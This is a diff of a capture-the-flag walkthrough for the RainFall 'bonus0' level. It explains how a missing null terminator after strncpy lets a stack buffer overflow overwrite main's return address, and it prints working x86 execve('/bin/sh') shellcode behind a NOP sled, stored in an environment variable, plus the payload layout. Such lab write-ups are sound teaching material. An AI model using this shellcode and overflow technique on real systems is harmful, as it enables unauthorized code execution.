@@ -53,7 +53,10 @@ int main()
 
 Let's focus on the `main` function. It reads input using the `read` function, the null terminator is then added with `strchr` and the string is copied to the `buf` buffer using `strncpy` with a size of 20. However, the `strncpy` function doesn't add a null terminator if the string is longer than the size provided. Therefore, the `str` buffer will not be null terminated.
 
-This will result in `strcpy` copying the `buf2` buffer to the `str` buffer, but it will not stop at the null terminator, since there is none. It will continue to copy the `buf` buffer to the `str` buffer, which can result in a buffer overflow. Then `strcat` will append the `buf` buffer to the `str` buffer. Let's first see how many bytes we need to overflow the buffer by analyzing the stack layout of our program:
+This will result in `strcpy` copying the `buf2` buffer to the `str` buffer, but it will not stop at the null terminator, since there is none, tt will continue to copy the `buf` buffer to the `str` buffer. Then `strcat` will append the `buf` buffer to the `str` buffer which will allow us to overflow the buffer and overwrite the return address of the `main` function.
+
+
+Let's first see how many bytes we need to overflow the buffer by analyzing the stack layout of our program:
 ```bash
 (gdb) b *main+38 # Breaking before leave
 Breakpoint 1 at 0x80485ca
@@ -115,7 +118,9 @@ buf = "BBBBBBBBBBBBBB" + Address (4 bytes) + "B"
 
 Since a ret2libc would requiere 12 bytes (4 bytes for the address of `system`, 4 bytes for the address of `exit` and 4 bytes for the address of "/bin/sh"), we're just going to use a ret2shellcode.
 
-We can either feed our shellcode to the program in the `buf` of the `p` function who has a size of 4096 bytes thanks to the `read` function, or we can put the shellcode in an environment variable `EXPLOIT`. For convenience, we'll use the environment variable:
+Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
+
+We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll use the environment variable:
 ```bash
 bonus0@RainFall:~$ export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
 ```
@@ -137,7 +142,7 @@ bonus0@RainFall:/tmp$ ./a.out
 0xbffff848
 ```
 
-Alright, let's craft our payloads:
+Alright, let's craft our payload:
 ```
 arg1 = padding of 20 bytes
 arg2 = padding of 14 bytes + address of the shellcode in the env + padding of 1 byte
